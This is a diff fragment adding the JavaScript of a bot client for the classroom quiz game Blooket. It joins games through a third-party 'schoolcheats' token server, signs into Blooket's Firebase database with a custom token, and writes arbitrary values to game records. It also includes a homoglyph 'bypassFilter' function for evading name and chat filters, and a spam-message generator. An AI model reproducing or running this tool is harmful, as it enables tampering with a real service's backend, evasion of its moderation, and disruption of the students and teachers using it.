+              case "input":
+
+                e.appendChild(createInp(t.name, t.action));
+
+                break;
+
+              case "select":
+
+                e.appendChild(createSel(t.name, t.computed, t.action));
+
+                break;
+
+              case "staticsel":
+
+                e.appendChild(createStaticSel(t.name, t.values, t.action));
+
+                break;
+
+              default:
+
+                console.log("Unsupported!");
+
+            }
+
+          });
+
+          return e;
+
+        }
+
+        function createStaticSel(e, t, n) {
+
+          var a = document.createElement("div");
+
+          a.className = "inputcontainer";
+
+          var o = document.createElement("div");
+
+          o.innerText = e + ":";
+
+          a.appendChild(o);
+
+          var r = document.createElement("select");
+
+          t.sort().forEach((e) => {
+
+            var t = document.createElement("option");
+
+            t.innerText = e;
+
+            r.appendChild(t);
+
+          });
+
+          a.appendChild(r);
+
+          a.addEventListener("click", function (e) {
+
+            if (e.target !== r) {
+
+              n(r.value);
+
+            }
+
+          });
+
+          return a;
+
+        }
+
+        function findGameCode(e) {
+
+          const t = e.match(/\b\d{7}\b/);
+
+          if (t) {
+
+            return t[0];
+
+          } else {
+
+            return null;
+
+          }
+
+        }
+
+        async function recogText(e, t) {
+
+          const n = await Tesseract.createWorker("eng");
+
+          t((await n.recognize(e)).data.text);
+
+          await n.terminate();
+
+        }
+
+        async function getCode() {
+
+          return await recogText("stream.png", function (e) {
+
+            var t = findGameCode(e);
+
+            if (t) {
+
+              document.querySelector("#gcode").value = t;
+
+            } else {
+
+              errorBar("No game code found but found text: " + e);
+
+            }
+
+          });
+
+        }
+
+        function genMessage(e, t) {
+
+          var n = "";
+
+          for (var a = 0; a < t; a++) {
+
+            n += e + " ";
+
+          }
+
+          return n;
+
+        }
+
+        async function connect(e, t, n) {
+
+          botinfo.connected = false;
+
+          botinfo.connecting = true;
+
+          botinfo.name = t;
+
+          botinfo.gid = e;
+
+          updateStatus("Fetching token...");
+
+          const a = await fetch(
+
+         “https://blooketbot.schoolcheats.net/join",
+
+            {
+
+              method: "POST",
+
+              headers: {
+
+                "Content-Type": "application/json",
+
+              },
+
+              body: JSON.stringify({
+
+                id: e,
+
+                name: t,
+
+              }),
+
+            }
+
+          ).then((e) => e.json());
+
+          updateStatus("Connecting to game...");
+
+          if (a.success) {
+
+            const o = initializeApp(
+
+              {
+
+                apiKey: "AIzaSyCA-cTOnX19f6LFnDVVsHXya3k6ByP_MnU",
+
+                authDomain: "blooket-2020.firebaseapp.com",
+
+                projectId: "blooket-2020",
+
+                storageBucket: "blooket-2020.appspot.com",
+
+                messagingSenderId: "741533559105",
+
+                appId: "1:741533559105:web:b8cbb10e6123f2913519c0",
+
+                measurementId: "G-S3H5NGN10Z",
+
+                databaseURL: a.fbShardURL,
+
+              },
+
+              t + "tt"
+
+            );
+
+            const r = getAuth(o);
+
+            await signInWithCustomToken(r, a.fbToken);
+
+            const c = getDatabase(o);
+
+            await set(ref(c, `${e}/c/${t}`), {
+
+              b: n
+
+                ? blooks[Math.floor(Math.random() * blooks.length)]
+
+                : "Rainbow Astronaut",
+
+              bg: n ? "" : "fire",
+
+              rt: true,
+
+            });
+
+            botinfo.fbdb = c;
+
+            botinfo.liveApp = o;
+
+            botinfo.connecting = false;
+
+            botinfo.connected = true;
+
+            updateStatus("Connected to game");
+
+            onValue(ref(c, `${e}`), (e) => {
+
+              if (botinfo.connected) {
+
+                onUpdateData(e.val());
+
+              }
+
+            });
+
+          } else {
+
+            updateStatus("Ready");
+
+            botinfo.connecting = false;
+
+            errorBar("Connect error: " + a.msg);
+
+          }
+
+        }
+
+        function bypassFilter(str) {
+
+          return str
+
+            .replace(/a/g, "\u0430")
+
+            .replace(/c/g, "\u0441")
+
+            .replace(/e/g, "\u0435")
+
+            .replace(/i/g, "\u0456")
+
+            .replace(/j/g, "\u0458")
+
+            .replace(/o/g, "\u043E")
+
+            .replace(/p/g, "\u0440")
+
+            .replace(/s/g, "\u0455")
+
+            .replace(/x/g, "\u0445")
+
+            .replace(/y/g, "\u0443")
+
+            .replace(/A/g, "\u0410")
+
+            .replace(/B/g, "\u0412")
+
+            .replace(/C/g, "\u0421")
+
+            .replace(/E/g, "\u0415")
+
+            .replace(/H/g, "\u041D")
+
+            .replace(/I/g, "\u0406")
+
+            .replace(/K/g, "\u039A")
+
+            .replace(/M/g, "\u041C")
+
+            .replace(/N/g, "\u039D")
+
+            .replace(/O/g, "\u041E")
+
+            .replace(/P/g, "\u0420")
+
+            .replace(/S/g, "\u0405")
+
+            .replace(/T/g, "\u0422")
+
+            .replace(/X/g, "\u0425")
+
+            .replace(/Y/g, "\u03A5")
+
+            .replace(/Z/g, "\u0396")
+
+            .replace(/!/g, "\u01C3")
+
+            .replace(/\./g, "\u2024")
+
+            .replace(/;/g, "\u037E")
+
+            .replace(/,/g, "\u201A")
+
+            .replace(/-/g, "\u2010");
+
+        }
+
+        function setVal(e, t) {
+
+          if (botinfo.connected) {
+
+            if (botinfo.fbdb) {
+
+              set(ref(botinfo.fbdb, e), t);
+
+            } else {
+
+              errorBar("Cannot set value when there is no game!");
+
+            }
+
+          } else {
+
+            errorBar("Cannot set value while disconnected!");
+
+          }
+
+        }
+
+        function setUserVal(e, t) {
+
+          console.log(e, t);
+
+          setVal(`/${botinfo.gid}/c/${botinfo.name}/${e}`, t);
+
+        }
+
+        document.querySelectorAll("checkbox").forEach((e) => {
+
+          e.addEventListener("click", function () {
+
+            if (e.getAttribute("checked")) {
+
+              e.removeAttribute("checked");
+
+            } else {
+
+              e.setAttribute("checked", "true");
+
+            }
+
+          });
+
+        });
+
+        document
+
+          .querySelector("#gcode")
+
+          .addEventListener("keydown", function (e) {
+
+            if (e.keyCode === 13) {
+
+              join();
+
+            }
+
+          });
+
+        document
+
+          .querySelector("#gname")
+
+          .addEventListener("keydown", function (e) {
+
+            if (e.keyCode === 13) {
+
+              join();
+
+            }
+
+          });
+
+        updateStatus("Ready");
+
+      </script>
+
+      <head></head>
+
+    </div>
+
+  </body>
+
+</html>
